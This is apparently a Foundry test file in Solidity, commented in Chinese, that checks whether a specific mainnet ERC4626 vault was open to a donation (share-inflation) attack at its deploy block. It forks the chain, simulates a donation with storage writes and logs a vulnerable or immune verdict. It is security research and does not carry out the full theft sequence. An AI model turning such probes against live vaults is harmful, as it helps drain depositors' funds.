// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// ===========================================================================
// Vault 0x90d2 Donation Attack PoC
//
// @KeyInfo
// Vault Address: 0x90d2af7d622ca3141efa4d8f1f24d86e5974cc8f
// Deploy Block: 21,833,795
// Lending Platform: Aave v3
//
// @AttackType
// ERC4626 Inflation Attack at Deploy Block
//
// @Strategy
// 部署即敏感 vault，fork 到部署区块测试 donation attack
// ===========================================================================

import "../basetest.sol";
import {IERC20} from "../interface.sol";

// ---------------------------------------------------------------------------
// 接口定义
// ---------------------------------------------------------------------------

interface IERC4626Vault is IERC20 {
    function asset() external view returns (address);
    function totalAssets() external view returns (uint256);
    function convertToShares(uint256 assets) external view returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function mint(uint256 shares, address receiver) external returns (uint256 assets);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);
    function withdraw(uint256 assets, address receiver, address owner) external returns (uint256 shares);
}

// ---------------------------------------------------------------------------
// 主测试合约
// ---------------------------------------------------------------------------

contract Vault_0x90d2_DonationPoC is BaseTestWithBalanceLog {
    // === 地址常量 ===
    IERC4626Vault internal constant VAULT = IERC4626Vault(0x90D2af7d622ca3141efA4d8f1F24d86E5974Cc8F);
    
    // === Fork 区块 - 部署区块 ===
    uint256 internal constant DEPLOY_BLOCK = 21_833_795;

    // === 攻击参数 ===
    uint256 internal constant DONATION_AMOUNT = 1000 * 1e18; // 1000 tokens

    // === 测试账户 ===
    address internal constant ATTACKER = address(0xdead);
    address internal constant VICTIM = address(0xbeef);

    // === 运行时变量 ===
    IERC20 internal assetToken;
    uint256 internal actualForkBlock;
    uint8 internal assetDecimals;

    function setUp() public {
        actualForkBlock = DEPLOY_BLOCK;
        vm.createSelectFork("mainnet", actualForkBlock);
        
        // 获取底层资产
        address assetAddr = VAULT.asset();
        assetToken = IERC20(assetAddr);
        fundingToken = assetAddr;
        assetDecimals = _getDecimals(assetAddr);

        vm.label(address(VAULT), "Vault");
        vm.label(assetAddr, "Asset");
        vm.label(ATTACKER, "Attacker");
        vm.label(VICTIM, "Victim");

        // 打印初始状态
        emit log_string("=== Setup: Checking Vault State at Deploy Block ===");
        emit log_named_uint("Fork Block", actualForkBlock);
        emit log_named_address("Vault", address(VAULT));
        emit log_named_address("Asset", assetAddr);
        emit log_named_decimal_uint("Vault.totalSupply()", VAULT.totalSupply(), assetDecimals);
        emit log_named_decimal_uint("Vault.totalAssets()", VAULT.totalAssets(), assetDecimals);
        emit log_named_decimal_uint("Asset.balanceOf(vault)", assetToken.balanceOf(address(VAULT)), assetDecimals);
    }

    // =========================================================================
    // 辅助函数
    // =========================================================================
    function _getDecimals(address token) internal returns (uint8) {
        (bool success, bytes memory data) = token.staticcall(abi.encodeWithSignature("decimals()"));
        if (success && data.length > 0) {
            return abi.decode(data, (uint8));
        }
        return 18;
    }

    function _setTokenBalance(address token, address account, uint256 amount) internal {
        // 尝试常见的 balanceOf slot (slot 0-9)
        for (uint256 i = 0; i < 10; i++) {
            bytes32 slot = keccak256(abi.encode(account, i));
            uint256 storedVal = uint256(vm.load(token, slot));
            uint256 currentBalance = IERC20(token).balanceOf(account);
            
            if (storedVal == currentBalance && currentBalance > 0) {
                vm.store(token, slot, bytes32(amount));
                return;
            }
        }
        
        // Fallback: 尝试 slot 2 (常见 mapping slot)
        bytes32 slot = keccak256(abi.encode(account, uint256(2)));
        vm.store(token, slot, bytes32(amount));
    }

    // =========================================================================
    // Test 1: 验证 vault 在部署区块是空的且 balance-based
    // =========================================================================
    function testDonationSensitivity() public {
        emit log_string("=== Test 1: Donation Sensitivity Check ===");
        emit log_named_uint("Fork Block", actualForkBlock);

        uint256 totalSupplyBefore = VAULT.totalSupply();
        uint256 totalAssetsBefore = VAULT.totalAssets();
        uint256 vaultBalanceBefore = assetToken.balanceOf(address(VAULT));

        emit log_named_decimal_uint("Total Supply Before", totalSupplyBefore, assetDecimals);
        emit log_named_decimal_uint("Total Assets Before", totalAssetsBefore, assetDecimals);
        emit log_named_decimal_uint("Vault Balance Before", vaultBalanceBefore, assetDecimals);

        // 验证 vault 是空的
        require(totalSupplyBefore == 0, "Vault should be empty at deploy block");
        emit log_string("[OK] Vault is EMPTY at deploy block");

        // 使用 vm.store 给 vault 增加余额 (模拟 donation)
        _setTokenBalance(address(assetToken), address(VAULT), DONATION_AMOUNT);

        uint256 totalAssetsAfter = VAULT.totalAssets();
        uint256 vaultBalanceAfter = assetToken.balanceOf(address(VAULT));

        emit log_named_decimal_uint("Total Assets After Donation", totalAssetsAfter, assetDecimals);
        emit log_named_decimal_uint("Vault Balance After Donation", vaultBalanceAfter, assetDecimals);

        // 检查 totalAssets 是否跟踪 balance
        if (totalAssetsAfter == totalAssetsBefore) {
            emit log_string("[INFO] totalAssets DID NOT change after donation");
            emit log_string("[FINDING] Vault uses INTERNAL ACCOUNTING (not balance-based)");
            emit log_string("[CONCLUSION] Classic donation attack NOT applicable");
        } else if (totalAssetsAfter == vaultBalanceAfter) {
            emit log_string("[OK] Vault is BALANCE-BASED (donation sensitive)");
            emit log_string("[WARNING] Vault may be VULNERABLE to donation attack");
        } else {
            emit log_string("[INFO] totalAssets changed but != balance");
            emit log_string("[FINDING] Vault has hybrid accounting");
        }

        // 断言
        require(totalAssetsAfter == vaultBalanceAfter || totalAssetsAfter == totalAssetsBefore, 
            "Unexpected vault behavior");
    }

    // =========================================================================
    // Test 2: 验证 donation 导致 share price 膨胀
    // =========================================================================
    function testDonationAttack() public balanceLog {
        emit log_string("=== Test 2: Donation Attack - Share Price Inflation ===");
        emit log_named_uint("Fork Block", actualForkBlock);

        uint256 totalSupplyBefore = VAULT.totalSupply();
        uint256 totalAssetsBefore = VAULT.totalAssets();

        emit log_named_decimal_uint("Initial Total Supply", totalSupplyBefore, assetDecimals);
        emit log_named_decimal_uint("Initial Total Assets", totalAssetsBefore, assetDecimals);

        // 执行 donation
        emit log_string("=== Simulating donation via vm.store ===");
        _setTokenBalance(address(assetToken), address(VAULT), DONATION_AMOUNT);

        uint256 totalAssetsAfterDonation = VAULT.totalAssets();
        uint256 vaultBalanceAfter = assetToken.balanceOf(address(VAULT));

        emit log_named_decimal_uint("Total Assets After Donation", totalAssetsAfterDonation, assetDecimals);
        emit log_named_decimal_uint("Vault Balance After Donation", vaultBalanceAfter, assetDecimals);

        // 分析结果
        if (totalAssetsAfterDonation == DONATION_AMOUNT) {
            emit log_string("[PASS] Donation successfully inflated totalAssets");
            emit log_string("[INFO] If vault had shares, share price would be inflated");
        } else if (totalAssetsAfterDonation == totalAssetsBefore) {
            emit log_string("[INFO] Donation had no effect on totalAssets");
            emit log_string("[PASS] Vault is IMMUNE to donation attack");
        } else {
            emit log_string("[INFO] Partial effect - needs further analysis");
        }
    }

    // =========================================================================
    // Test 3: 完整攻击分析
    // =========================================================================
    function testFullAttackFlow() public balanceLog {
        emit log_string("============================================================");
        emit log_string("=== Test 3: Full Donation Attack Analysis ===");
        emit log_string("============================================================");
        emit log_named_uint("Fork Block", actualForkBlock);

        // 记录初始状态
        uint256 initialTotalSupply = VAULT.totalSupply();
        uint256 initialTotalAssets = VAULT.totalAssets();
        uint256 initialVaultBalance = assetToken.balanceOf(address(VAULT));

        emit log_named_decimal_uint("Initial Total Supply", initialTotalSupply, assetDecimals);
        emit log_named_decimal_uint("Initial Total Assets", initialTotalAssets, assetDecimals);
        emit log_named_decimal_uint("Initial Vault Balance", initialVaultBalance, assetDecimals);

        require(initialTotalSupply == 0, "Vault must be empty for analysis");

        // =============================================================
        // Step 1: 模拟 donation
        // =============================================================
        emit log_string("");
        emit log_string("=== Step 1: Simulating donation ===");
        
        _setTokenBalance(address(assetToken), address(VAULT), DONATION_AMOUNT);

        uint256 totalAssetsAfterDonation = VAULT.totalAssets();
        uint256 vaultBalanceAfterDonation = assetToken.balanceOf(address(VAULT));

        emit log_named_decimal_uint("Donation Amount", DONATION_AMOUNT, assetDecimals);
        emit log_named_decimal_uint("Total Assets After Donation", totalAssetsAfterDonation, assetDecimals);
        emit log_named_decimal_uint("Vault Balance After Donation", vaultBalanceAfterDonation, assetDecimals);

        // =============================================================
        // Step 2: 分析结果
        // =============================================================
        emit log_string("");
        emit log_string("=== Step 2: Analyzing results ===");

        bool totalAssetsChanged = (totalAssetsAfterDonation != initialTotalAssets);
        bool totalAssetsEqualsBalance = (totalAssetsAfterDonation == vaultBalanceAfterDonation);

        emit log_named_uint("Total Assets Changed", totalAssetsChanged ? 1 : 0);
        emit log_named_uint("Total Assets == Balance", totalAssetsEqualsBalance ? 1 : 0);

        // =============================================================
        // 最终分析
        // =============================================================
        emit log_string("");
        emit log_string("============================================================");
        emit log_string("=== FINAL ANALYSIS ===");
        emit log_string("============================================================");

        if (totalAssetsChanged && totalAssetsEqualsBalance) {
            emit log_string("");
            emit log_string("[FINDING 1] Donation increased vault balance");
            emit log_string("[FINDING 2] totalAssets() == balanceOf(vault)");
            emit log_string("");
            emit log_string("[CONCLUSION] Vault is BALANCE-BASED");
            emit log_string("             Classic donation attack is POSSIBLE");
            emit log_string("");
            emit log_string("[SECURITY STATUS] VULNERABLE to donation attack");
        } else if (!totalAssetsChanged) {
            emit log_string("");
            emit log_string("[FINDING] totalAssets did NOT change after donation");
            emit log_string("");
            emit log_string("[CONCLUSION] Vault uses INTERNAL ACCOUNTING");
            emit log_string("             Classic donation attack is NOT possible");
            emit log_string("");
            emit log_string("[SECURITY STATUS] IMMUNE to donation attack");
        } else {
            emit log_string("");
            emit log_string("[INFO] Vault has hybrid accounting");
            emit log_string("       Further investigation needed");
        }

        emit log_string("");
        emit log_string("============================================================");
        emit log_string("[OK] Analysis completed!");
        emit log_string("============================================================");
    }
}
